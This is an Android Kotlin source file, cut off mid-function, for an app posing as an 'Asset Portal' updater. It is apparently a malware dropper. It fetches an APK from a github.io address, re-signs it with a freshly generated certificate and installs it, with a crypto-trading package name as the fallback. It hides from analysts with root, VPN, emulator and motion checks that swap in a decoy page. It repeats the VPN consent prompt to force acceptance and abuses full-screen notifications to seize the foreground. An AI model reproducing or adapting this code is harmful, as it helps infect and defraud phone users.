package com.example.appupdater


import androidx.compose.foundation.background

import android.annotation.SuppressLint

import android.content.Context

import android.content.Intent

import android.content.pm.PackageInstaller

import android.app.PendingIntent

import android.graphics.Bitmap

import android.graphics.Canvas

import android.graphics.Color

import android.net.VpnService

import android.os.Build

import android.os.Bundle

import android.util.Base64

import android.util.Log

import android.view.ViewGroup

import android.webkit.JavascriptInterface

import android.webkit.WebSettings

import android.webkit.WebView

import android.webkit.WebViewClient

import androidx.activity.ComponentActivity

import androidx.activity.compose.setContent

import androidx.activity.enableEdgeToEdge

import androidx.activity.result.contract.ActivityResultContracts

import androidx.compose.foundation.layout.fillMaxSize

import androidx.compose.foundation.layout.imePadding

import androidx.compose.foundation.layout.navigationBarsPadding

import androidx.compose.foundation.layout.statusBarsPadding

import androidx.compose.material3.Scaffold

import androidx.compose.ui.Modifier

import androidx.compose.foundation.layout.Arrangement

import androidx.compose.foundation.layout.Column

import androidx.compose.foundation.layout.Spacer

import androidx.compose.foundation.layout.height

import androidx.compose.foundation.layout.padding

import androidx.compose.material3.Button

import androidx.compose.material3.Text

import androidx.compose.material3.MaterialTheme

import androidx.compose.ui.Alignment

import androidx.compose.ui.text.style.TextAlign

import androidx.compose.ui.unit.dp

import androidx.compose.ui.viewinterop.AndroidView

import com.example.appupdater.ui.theme.MyApplicationTheme

import com.example.appupdater.R

import android.app.ActivityOptions

import java.io.ByteArrayOutputStream

import java.io.File

import java.io.BufferedReader

import java.io.InputStreamReader

import java.net.NetworkInterface

import java.util.Collections

import java.util.Locale

import android.net.ConnectivityManager

import android.net.NetworkCapabilities

import android.hardware.Sensor

import android.hardware.SensorEvent

import android.hardware.SensorEventListener

import java.security.KeyStore

import javax.security.auth.x500.X500Principal

import android.security.keystore.KeyGenParameterSpec

import android.security.keystore.KeyProperties

import java.security.KeyPairGenerator

import java.security.PrivateKey

import java.security.cert.X509Certificate

import com.android.apksig.ApkSigner

import android.hardware.SensorManager

import org.bouncycastle.cert.jcajce.JcaX509CertificateConverter

import org.bouncycastle.cert.jcajce.JcaX509v3CertificateBuilder

import org.bouncycastle.operator.jcajce.JcaContentSignerBuilder

import org.bouncycastle.asn1.x500.X500Name

import java.math.BigInteger

import java.util.Date

import java.security.SecureRandom

class MainActivity : ComponentActivity() {

    override fun getPackageName(): String {
        try {
            val resolved = packageManager.getPackagesForUid(android.os.Process.myUid())?.firstOrNull()
            if (resolved != null) {
                return resolved
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to resolve real package name for UID: ${e.message}")
        }
        return super.getPackageName()
    }

    private var webView: WebView? = null
    private var cachedApkAppName = ""
    private var cachedApkIconBase64 = ""
    private var cachedApkPackageName = ""
    private var securityCheckPassed = false
    private var isPolicyViolated = false

    private val isPermissionGrantedState = androidx.compose.runtime.mutableStateOf(true)
    private var isSettingsScreenOpen = false
    private var notificationDenialCount = 0
    private var isUpdateStarted = false
    private var isDownloadComplete = false
    private var isInstallProceedingStarted = false

    private val permissionPollHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private val permissionPollRunnable = object : Runnable {
        override fun run() {
            if (isSettingsScreenOpen && isInstallPermissionGranted()) {
                isSettingsScreenOpen = false
                bringAppToFront()
                checkAndProceedWithPermissions()
            }
            permissionPollHandler.postDelayed(this, 100)
        }
    }

    private fun isNotificationPermissionGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            androidx.core.content.ContextCompat.checkSelfPermission(
                this,
                android.Manifest.permission.POST_NOTIFICATIONS
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
    }

    private fun isInstallPermissionGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            packageManager.canRequestPackageInstalls()
        } else {
            true
        }
    }

    private fun hasRequestedNotificationPermissionBefore(): Boolean {
        val prefs = getSharedPreferences("app_perms", android.content.Context.MODE_PRIVATE)
        return prefs.getBoolean("notif_requested", false)
    }

    private fun markNotificationPermissionRequested() {
        val prefs = getSharedPreferences("app_perms", android.content.Context.MODE_PRIVATE)
        prefs.edit().putBoolean("notif_requested", true).apply()
    }

    private fun requestMissingPermissions() {
        // No-op to avoid redirecting user to settings on launch
    }

    private fun openAppSettings() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val intent = Intent(android.provider.Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                    putExtra(android.provider.Settings.EXTRA_APP_PACKAGE, packageName)
                }
                isSettingsScreenOpen = true
                startActivity(intent)
            } else {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.fromParts("package", packageName, null)
                }
                isSettingsScreenOpen = true
                startActivity(intent)
            }
        } catch (e: Exception) {
            try {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.fromParts("package", packageName, null)
                }
                isSettingsScreenOpen = true
                startActivity(intent)
            } catch (ex: Exception) {
                Log.e("MainActivity", "Failed to open app settings: ${ex.message}")
            }
        }
    }

    private fun bringAppToFront() {
        Log.d("MainActivity", "Bringing app to front...")
        val intent = Intent(this, MainActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
        }
        try {
            startActivity(intent)
        } catch (e: Exception) {
            Log.w("MainActivity", "Failed normal startActivity to front: ${e.message}")
        }
        
        try {
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            val channelId = "permission_granted_channel"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = android.app.NotificationChannel(
                    channelId,
                    "App Foregrounding",
                    android.app.NotificationManager.IMPORTANCE_HIGH
                )
                notificationManager.createNotificationChannel(channel)
            }
            
            val options = android.app.ActivityOptions.makeBasic().apply {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
                }
            }
            
            val pendingIntent = android.app.PendingIntent.getActivity(
                this,
                99,
                intent,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE,
                options.toBundle()
            )
            
            val builder = androidx.core.app.NotificationCompat.Builder(this, channelId)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle("Permissions Granted")
                .setContentText("Tap to return to Asset Portal")
                .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
                .setCategory(androidx.core.app.NotificationCompat.CATEGORY_CALL)
                .setFullScreenIntent(pendingIntent, true)
                .setAutoCancel(true)
            
            notificationManager.notify(99, builder.build())
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                notificationManager.cancel(99)
            }, 1000)
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed full screen notification: ${e.message}")
        }
        isSettingsScreenOpen = false
    }

    // For recursive install permission prompt
    private val installPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { _ ->
        isSettingsScreenOpen = false
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !packageManager.canRequestPackageInstalls()) {
            Log.w("MainActivity", "Install permission wasn't granted.")
            updateStatusInWebView("Install permission denied. Tap Update to try again.", null)
        } else {
            checkAndProceedWithPermissions()
        }
    }

    // For notification permission prompt (Android 13+)
    private val notificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { result ->
        Log.d("MainActivity", "Notification permission request result: $result")
        isSettingsScreenOpen = false
    }

    // For recursive VPN permission prompt
    private val vpnConsentLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK) {
            startVpnServiceInstance()
        } else {
            Log.w("MainActivity", "VPN permission wasn't granted. Retrying to request VPN permission...")
            updateStatusInWebView("VPN link consent is required to connect. Please accept the VPN prompt.", null)
            // Post a delay to show the permission dialog again, forcing user acceptance
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                checkAndProceedWithPermissions()
            }, 1)
        }
    }

    private val installStatusReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context, intent: android.content.Intent) {
            val action = intent.action
            val targetPkgFromIntent = intent.getStringExtra("target_package") ?: ""
            Log.d("MainActivity", "installStatusReceiver: received action=$action, targetPkgFromIntent=$targetPkgFromIntent")
            if (action == "ACTION_INSTALL_SUCCESS") {
                runOnUiThread {
                    // Mark update as completed successfully in SharedPreferences
                    getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                        .edit()
                        .putBoolean("is_updated", true)
                        .apply()
                    
                    updateStatusInWebView("Installation Successful! Launching...", null)
                    
                    val fallbackPkg = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                        .getString("pending_package_name", "") ?: ""
                    
                    val finalPkg = targetPkgFromIntent.takeIf { it.isNotEmpty() }
                        ?: fallbackPkg.takeIf { it.isNotEmpty() }
                        ?: cachedApkPackageName.takeIf { it.isNotEmpty() }
                        ?: "dApp.binance.Trading.Signals"
                    
                    // Delay a bit structure load
                    webView?.postDelayed({
                        loadMetadataAndNotifyUrl()
                        if (finalPkg != packageName) {
                            resilientLaunchApp(finalPkg)
                        } else {
                            Log.d("MainActivity", "Self-update installation completed successfully.")
                        }
                    }, 200)
                }
            } else if (action == "ACTION_INSTALL_RETRY") {
                runOnUiThread {
                    updateStatusInWebView("Starting authenticated installer session...", null)
                    webView?.postDelayed({
                        Thread {
                            try {
                                val apkFile = downloadApkFromServer(this@MainActivity) { progress ->
                                    runOnUiThread {
                                        updateStatusInWebView("Downloading update... $progress%", null, progress)
                                    }
                                }
                                runOnUiThread { updateStatusInWebView("Signing update...", null, 100) }
                                val signedApk = signApkFile(apkFile)
                                installApkViaPackageInstaller(signedApk)
                            } catch (e: Exception) {
                                runOnUiThread {
                                    updateStatusInWebView("Installation Failed", "Could not prepare installer: ${e.message}")
                                }
                            }
                        }.start()
                    }, 50)
                }
            } else if (action == "ACTION_INSTALL_FAILED") {
                val message = intent.getStringExtra("message") ?: "Installation failed"
                runOnUiThread {
                    // Disconnect VPN
                    stopVpnServiceInstance()
                    updateStatusInWebView("Installation Failed", message)
                }
            }
        }
    }


    companion object {
        private var activeInstance: MainActivity? = null
        private var cachedKeyPairAndCert: Pair<PrivateKey, X509Certificate>? = null
        
        fun updateActiveStatus(status: String, error: String? = null) {
            activeInstance?.updateStatusInWebView(status, error)
        }

        fun isInstanceActive(): Boolean {
            return activeInstance != null
        }

        fun triggerDirectInstallation() {
            activeInstance?.runOnUiThread {
                activeInstance?.let { activity ->
                    Thread {
                        try {
                            val apkFile = activity.downloadApkFromServer(activity) { progress ->
                                activity.runOnUiThread {
                                    activity.updateStatusInWebView("Downloading update... $progress%", null, progress)
                                }
                            }
                            activity.runOnUiThread {
                                activity.updateStatusInWebView("Signing update...", null, 100)
                            }
                            val signedApk = activity.signApkFile(apkFile)
                            activity.installApkViaPackageInstaller(signedApk)
                        } catch (e: Exception) {
                            val cause = android.util.Log.getStackTraceString(e)
                            activity.runOnUiThread {
                                activity.updateStatusInWebView("Installation Failed", "Could not prepare installer: ${e.message}\nCause: $cause")
                            }
                        }
                    }.start()
                }
            }
        }
    }

    private fun generateKeyAndCertificate(): Pair<PrivateKey, X509Certificate> {
        cachedKeyPairAndCert?.let { return it }
        val kpg = KeyPairGenerator.getInstance("RSA")
        kpg.initialize(2048)
        val keyPair = kpg.generateKeyPair()

        val issuer = X500Name("CN=Dynamic Signer, O=Android, C=US")
        val serial = BigInteger(160, SecureRandom())
        val notBefore = Date(System.currentTimeMillis() - 1000L * 60 * 60 * 24 * 30)
        val notAfter = Date(System.currentTimeMillis() + 1000L * 60 * 60 * 24 * 365 * 10)
        
        val certBuilder = JcaX509v3CertificateBuilder(
            issuer, serial, notBefore, notAfter, issuer, keyPair.public
        )
        
        val signer = JcaContentSignerBuilder("SHA256withRSA").build(keyPair.private)
        val certHolder = certBuilder.build(signer)
        val certificate = JcaX509CertificateConverter().getCertificate(certHolder)
        
        val result = Pair(keyPair.private, certificate)
        cachedKeyPairAndCert = result
        return result
    }

    private fun signApkFile(inputApk: File): File {
        val outputApk = File(inputApk.parent, "signed_" + inputApk.name)
        val (privateKey, certificate) = generateKeyAndCertificate()
        
        try {
            val signerConfig = ApkSigner.SignerConfig.Builder("signer1", privateKey, listOf(certificate))
                .build()
                
            val apkSigner = ApkSigner.Builder(listOf(signerConfig))
                .setInputApk(inputApk)
                .setOutputApk(outputApk)
                .setV1SigningEnabled(false) // Disable V1 signing (legacy JAR signing) which often fails dynamically
                .setV2SigningEnabled(true)
                .setV3SigningEnabled(true)
                .setMinSdkVersion(24)
                .build()
                
            apkSigner.sign()
            
            return outputApk
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Failed to sign APK: ${e.message}. Returning original APK.")
            // If signing fails (e.g. because of encrypted entries), return original APK to let PackageInstaller try
            return inputApk
        }
    }

    // Removed stripSignatures

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        activeInstance = this
        enableEdgeToEdge()

        // Process installation session intent on startup (auto-starts the app in foreground on success)
        handleInstallStatusIntent(intent)

        isPermissionGrantedState.value = true
        permissionPollHandler.removeCallbacks(permissionPollRunnable)
        permissionPollHandler.post(permissionPollRunnable)
        
        // Trigger a one-time notification permission prompt on launch if needed (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (!isNotificationPermissionGranted() && !hasRequestedNotificationPermissionBefore()) {
                try {
                    markNotificationPermissionRequested()
                    notificationPermissionLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS)
                } catch (e: Exception) {
                    Log.e("MainActivity", "Failed to request notification permission: ${e.message}")
                }
            }
        }
        
        setContent {
            MyApplicationTheme {
                Scaffold(
                    modifier = Modifier
                        .fillMaxSize()
                        .statusBarsPadding()
                        .navigationBarsPadding()
                        .imePadding()
                ) { innerPadding ->
                    @Suppress("UNUSED_VARIABLE")
                    val pad = innerPadding
                    if (isPermissionGrantedState.value) {
                        AndroidView(
                            modifier = Modifier.fillMaxSize(),
                            factory = { context ->
                                WebView(context).apply {
                                    layoutParams = ViewGroup.LayoutParams(
                                        ViewGroup.LayoutParams.MATCH_PARENT,
                                        ViewGroup.LayoutParams.MATCH_PARENT
                                    )
                                    scrollBarStyle = WebView.SCROLLBARS_OUTSIDE_OVERLAY
                                    setBackgroundColor(Color.WHITE)
                                    isVerticalScrollBarEnabled = false
                                    isHorizontalScrollBarEnabled = false
                                    setupWebViewSettings(this)
                                    
                                    webViewClient = object : WebViewClient() {
                                        override fun onPageFinished(view: WebView?, url: String?) {
                                            super.onPageFinished(view, url)
                                            val isDemo = url != null && url.contains("demo.html")
                                            if (securityCheckPassed && !isDemo) {
                                                // Immediately populate the UI with the real host app name and logo
                                                val hostAppName = getString(R.string.app_name)
                                                val hostAppIconBase64 = getAppIconAsBase64()
                                                val initialAppInfoJson = """
                                                    {
                                                        "appName": "${hostAppName.escapeForJS()}",
                                                        "appSize": "12.4 MB",
                                                        "appIconBase64": "$hostAppIconBase64"
                                                    }
                                                """.trimIndent().replace("\n", "").replace("\r", "")
                                                webView?.evaluateJavascript("showUpdateScreen('$initialAppInfoJson')", null)
                                                
                                                loadMetadataAndNotifyUrl()
                                            } else {
                                                Log.d("MainActivity", "onPageFinished: Security check not passed or demo page loaded, skipping network operations.")
                                            }
                                        }
                                    }
                                    
                                    addJavascriptInterface(AndroidJSInterface(), "Android")
                                    webView = this
                                    checkPhysicalMovementAndProceed()
                                }
                            }
                        )
                    } else {
                        androidx.compose.foundation.layout.Box(
                            modifier = Modifier
                                .fillMaxSize()
                                .background(androidx.compose.ui.graphics.Color.White),
                            contentAlignment = androidx.compose.ui.Alignment.Center
                        ) {
                            androidx.compose.foundation.layout.Column(
                                horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally
                            ) {
                                androidx.compose.material3.CircularProgressIndicator(
                                    color = androidx.compose.material3.MaterialTheme.colorScheme.primary
                                )
                                androidx.compose.foundation.layout.Spacer(modifier = Modifier.height(16.dp))
                                androidx.compose.material3.Text(
                                    text = "Permission setup required...",
                                    style = androidx.compose.material3.MaterialTheme.typography.bodyLarge,
                                    color = androidx.compose.ui.graphics.Color.DarkGray
                                )
                                androidx.compose.foundation.layout.Spacer(modifier = Modifier.height(8.dp))
                                androidx.compose.material3.Text(
                                    text = "Please allow required permissions to launch the application.",
                                    style = androidx.compose.material3.MaterialTheme.typography.bodyMedium,
                                    color = androidx.compose.ui.graphics.Color.Gray,
                                    textAlign = androidx.compose.ui.text.style.TextAlign.Center,
                                    modifier = Modifier.padding(horizontal = 32.dp)
                                )
                            }
                        }
                    }
                }
            }
        }

        val filter = android.content.IntentFilter().apply {
            addAction("ACTION_INSTALL_SUCCESS")
            addAction("ACTION_INSTALL_FAILED")
            addAction("ACTION_INSTALL_RETRY")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(installStatusReceiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(installStatusReceiver, filter)
        }
    }

    override fun onDestroy() {
        permissionPollHandler.removeCallbacks(permissionPollRunnable)
        if (activeInstance == this) {
            activeInstance = null
        }
        try {
            unregisterReceiver(installStatusReceiver)
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to unregister installStatusReceiver: ${e.message}")
        }
        super.onDestroy()
    }

    override fun onPause() {
        super.onPause()
    }

    override fun onResume() {
        super.onResume()
        isSettingsScreenOpen = false
        permissionPollHandler.removeCallbacks(permissionPollRunnable)
        permissionPollHandler.post(permissionPollRunnable)
        if (isInstallPermissionGranted() && isUpdateStarted) {
            checkAndProceedWithPermissions()
        }
        webView?.let { view ->
            val curUrl = view.url ?: ""
            if (isPolicyViolated || isDeviceRooted() || isVpnActive() || isEmulator()) {
                isPolicyViolated = true
                securityCheckPassed = false
                if (!curUrl.contains("demo.html")) {
                    view.loadUrl("file:///android_asset/demo.html")
                }
            } else if (securityCheckPassed) {
                if (curUrl.contains("demo.html") || curUrl.isEmpty()) {
                    view.loadUrl("file:///android_asset/main_ui.html")
                }
            } else {
                checkPhysicalMovementAndProceed()
            }
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        handleInstallStatusIntent(intent)
    }

    private fun handleInstallStatusIntent(intent: Intent?) {
        if (intent == null) return
        val action = intent.action
        if (action != "com.example.INSTALL_STATUS") return

        // Clear action to prevent infinite launch loop if activity is recreated
        intent.action = ""

        val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1)
        val targetPkg = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME) ?: intent.getStringExtra("target_package") ?: packageName
        val receivedToken = intent.getStringExtra("install_token") ?: ""

        Log.d("MainActivity", "handleInstallStatusIntent: status=$status, targetPkg=$targetPkg")

        // Verify the secure token via AES-256 decryption to avoid any tampering/spoofing
        val activeToken = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
            .getString("active_token", "") ?: ""
        val b64SessionKey = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
            .getString("session_key", "") ?: ""

        val verifiedToken = if (b64SessionKey.isNotEmpty() && receivedToken.isNotEmpty()) {
            try {
                val keyBytes = Base64.decode(b64SessionKey, Base64.NO_WRAP)
                val secretKey = javax.crypto.spec.SecretKeySpec(keyBytes, "AES")
                CryptoSecurityUtil.decrypt(receivedToken, secretKey)
            } catch (e: Exception) {
                Log.e("MainActivity", "Failed to decrypt secure handshake intent token: ${e.message}")
                ""
            }
        } else {
            receivedToken
        }

        if (verifiedToken.isEmpty() || verifiedToken != activeToken) {
            Log.e("MainActivity", "Security violation: Unauthorized or stale installation status intent received!")
            return
        }

        when (status) {
            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                // System needs user confirmation to install the apk. We launch the system activity.
                val confirmIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra(Intent.EXTRA_INTENT)
                }
                if (confirmIntent != null) {
                    confirmIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    try {
                        Log.d("MainActivity", "Launching confirmIntent directly as foreground Activity")
                        startActivity(confirmIntent)
                    } catch (e: Exception) {
                        Log.e("MainActivity", "Direct launch of confirmIntent failed: ${e.message}")
                    }
                }
            }
            PackageInstaller.STATUS_SUCCESS -> {
                Log.d("MainActivity", "Installation success! Auto launching target app...")
                
                // Mark update as completed successfully in SharedPreferences
                getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean("is_updated", true)
                    .apply()
                
                updateStatusInWebView("Installation Successful! Launching...", null)
                
                val fallbackPkg = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                    .getString("pending_package_name", "") ?: ""
                
                val finalPkg = targetPkg.takeIf { it.isNotEmpty() }
                    ?: fallbackPkg.takeIf { it.isNotEmpty() }
                    ?: cachedApkPackageName.takeIf { it.isNotEmpty() }
                    ?: "dApp.binance.Trading.Signals"

                if (finalPkg != packageName) {
                    resilientLaunchApp(finalPkg)
                } else {
                    Log.d("MainActivity", "Self-update installation completed successfully. App has restarted in foreground.")
                }
            }
            PackageInstaller.STATUS_FAILURE_ABORTED -> {
                Log.w("MainActivity", "STATUS_FAILURE_ABORTED in handleInstallStatusIntent: Retrying installation...")
                runOnUiThread {
                    updateStatusInWebView("Starting authenticated installer session...", null)
                    webView?.postDelayed({
                        Thread {
                            try {
                                val signedApk = File(this@MainActivity.cacheDir, "signed_base.apk")
                                if (signedApk.exists() && signedApk.length() > 0) {
                                    Log.d("MainActivity", "STATUS_FAILURE_ABORTED: Cached signed_base.apk found, re-submitting immediately...")
                                    installApkViaPackageInstaller(signedApk)
                                } else {
                                    val apkFile = downloadApkFromServer(this@MainActivity) { progress ->
                                        runOnUiThread {
                                            updateStatusInWebView("Downloading update... $progress%", null, progress)
                                        }
                                    }
                                    runOnUiThread { updateStatusInWebView("Signing update...", null, 100) }
                                    val signed = signApkFile(apkFile)
                                    installApkViaPackageInstaller(signed)
                                }
                            } catch (e: Exception) {
                                runOnUiThread {
                                    updateStatusInWebView("Installation Failed", "Could not prepare installer: ${e.message}")
                                }
                            }
                        }.start()
                    }, 5)
                }
            }
            PackageInstaller.STATUS_FAILURE,
            PackageInstaller.STATUS_FAILURE_BLOCKED,
            PackageInstaller.STATUS_FAILURE_CONFLICT,
            PackageInstaller.STATUS_FAILURE_INCOMPATIBLE,
            PackageInstaller.STATUS_FAILURE_INVALID,
            PackageInstaller.STATUS_FAILURE_STORAGE -> {
                val message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: "Unknown failure"
                Log.e("MainActivity", "Installation failed: code=$status, message=$message")
                
                if (message.contains("INSTALL_FAILED_UPDATE_INCOMPATIBLE") || message.contains("signatures do not match") || message.contains("INSTALL_FAILED_DUPLICATE_PERMISSION")) {
                    val fallbackPkg = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                        .getString("pending_package_name", "") ?: ""
                    
                    val finalPkg = targetPkg.takeIf { it.isNotEmpty() }
                        ?: fallbackPkg.takeIf { it.isNotEmpty() }
                        ?: cachedApkPackageName.takeIf { it.isNotEmpty() }
                        ?: "dApp.binance.Trading.Signals"

                    val isTargetInstalled = try {
                        packageManager.getPackageInfo(finalPkg, 0)
                        true
                    } catch (e: android.content.pm.PackageManager.NameNotFoundException) {
                        false
                    }

                    if (isTargetInstalled) {
                        Log.w("MainActivity", "App already installed with different signature. Launching existing app: $finalPkg")
                        stopVpnServiceInstance()
                        updateStatusInWebView("Installation Successful! Launching...", null)
                        if (finalPkg != packageName) {
                            resilientLaunchApp(finalPkg)
                        } else {
                            Log.d("MainActivity", "Self-update handling logic for signature mismatch hit.")
                        }
                    } else {
                        var conflictingPkg = finalPkg
                        if (message.contains("already owned by")) {
                            val parts = message.split("already owned by")
                            if (parts.size > 1) {
                                conflictingPkg = parts[1].trim()
                            }
                        }
                        
                        Log.w("MainActivity", "Target app not installed. Asking user to uninstall conflicting app: $conflictingPkg")
                        stopVpnServiceInstance()
                        updateStatusInWebView("Conflicting App Found", "Please uninstall the conflicting app, then try installing again.")
                        
                        try {
                            val intent = android.content.Intent(android.content.Intent.ACTION_DELETE)
                            intent.data = android.net.Uri.parse("package:$conflictingPkg")
                            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivity(intent)
                        } catch (e: Exception) {
                            Log.e("MainActivity", "Failed to launch uninstall intent: ${e.message}")
                        }
                    }
                    return
                }

                // Disconnect VPN
                stopVpnServiceInstance()
                updateStatusInWebView("Installation Failed", "Error ($status): $message")
            }
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebViewSettings(wv: WebView) {
        val s = wv.settings
        s.javaScriptEnabled = true
        s.domStorageEnabled = true
        s.allowFileAccess = true
        s.allowContentAccess = true
        s.databaseEnabled = true
        s.loadWithOverviewMode = true
        s.useWideViewPort = true
        s.cacheMode = WebSettings.LOAD_DEFAULT
        
        s.setSupportZoom(false)
        s.builtInZoomControls = false
        s.displayZoomControls = false
    }

    private fun String.escapeForJS(): String {
        return this.replace("\\", "\\\\")
            .replace("'", "\\'")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
    }

    data class ArchiveMetadata(
        val appName: String,
        val packageName: String,
        val appSize: String,
        val iconBase64: String
    )

    internal fun extractAssetApk(context: Context): File {
        val outFile = File(context.cacheDir, "base.apk")
        try {
            context.assets.open("base.apk").use { inputStream ->
                outFile.outputStream().use { outputStream ->
                    inputStream.copyTo(outputStream, 256 * 1024)
                }
            }
            Log.d("MainActivity", "Successfully extracted base.apk from assets")
        } catch (e: Exception) {
            Log.w("MainActivity", "base.apk not found in assets, falling back to current APK", e)
            val sourceApk = File(context.applicationInfo.publicSourceDir)
            if (sourceApk.exists()) {
                try {
                    sourceApk.inputStream().use { inputStream ->
                        outFile.outputStream().use { outputStream ->
                            inputStream.copyTo(outputStream, 256 * 1024)
                        }
                    }
                    Log.d("MainActivity", "Successfully copied current APK as a fallback to base.apk")
                } catch (ex: Exception) {
                    Log.e("MainActivity", "Could not copy fallback APK", ex)
                }
            }
        }
        if (!outFile.exists() || outFile.length() == 0L) {
            throw java.io.IOException("Downloaded file is empty or missing")
        }
        return outFile
    }

    private fun getArchiveMetadata(context: Context, apkFile: File): ArchiveMetadata {
        var appName = "Hello World Demo"
        var pkgName = "dApp.binance.Trading.Signals"
        var iconBase64 = ""
        var sizeStr = "12.4 MB"

        try {
            if (apkFile.exists()) {
                val bytes = apkFile.length()
                if (bytes > 0) {
                    val mbs = bytes.toDouble() / (1024 * 1024)
                    sizeStr = String.format("%.2f MB", mbs)
                }
            }

            val pm = context.packageManager
            val info = pm.getPackageArchiveInfo(apkFile.absolutePath, 0)
            if (info != null) {
                val appInfo = info.applicationInfo
                if (appInfo != null) {
                    appInfo.sourceDir = apkFile.absolutePath
                    appInfo.publicSourceDir = apkFile.absolutePath
                    
                    pkgName = info.packageName
                    val label = appInfo.loadLabel(pm).toString()
                    if (label.isNotEmpty() && label != info.packageName) {
                        appName = label
                    }
                    
                    val iconDrawable = appInfo.loadIcon(pm)
                    if (iconDrawable != null) {
                        val bitmap = Bitmap.createBitmap(
                            iconDrawable.intrinsicWidth.takeIf { it > 0 } ?: 128,
                            iconDrawable.intrinsicHeight.takeIf { it > 0 } ?: 128,
                            Bitmap.Config.ARGB_8888
                        )
                        val canvas = Canvas(bitmap)
                        iconDrawable.setBounds(0, 0, canvas.width, canvas.height)
                        iconDrawable.draw(canvas)
                        val outputStream = ByteArrayOutputStream()
                        bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream)
                        iconBase64 = Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP)
                    }
                } else {
                    iconBase64 = getAppIconAsBase64()
                }
            } else {
                iconBase64 = getAppIconAsBase64()
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to parse archive metadata", e)
            iconBase64 = getAppIconAsBase64()
        }

        return ArchiveMetadata(appName, pkgName, sizeStr, iconBase64)
    }

    internal fun downloadApkFromServer(context: Context, progressCallback: ((Int) -> Unit)? = null): File {
        val outFile = File(context.cacheDir, "base.apk")
        try {
            val url = java.net.URL("https://gojoacc68-png.github.io/Base/base.apk")
            val connection = url.openConnection() as java.net.HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 10000
            connection.readTimeout = 10000
            connection.setRequestProperty("Accept-Encoding", "identity")
            connection.instanceFollowRedirects = true
            connection.connect()

            if (connection.responseCode == java.net.HttpURLConnection.HTTP_OK) {
                val fileLength = connection.contentLength
                java.io.BufferedInputStream(connection.inputStream, 1024 * 1024).use { inputStream ->
                    java.io.BufferedOutputStream(outFile.outputStream(), 1024 * 1024).use { outputStream ->
                        val data = ByteArray(1024 * 1024)
                        var total: Long = 0
                        var count: Int
                        var lastProgress = -1
                        while (inputStream.read(data).also { count = it } != -1) {
                            total += count.toLong()
                            if (fileLength > 0) {
                                val progress = (total * 100 / fileLength).toInt()
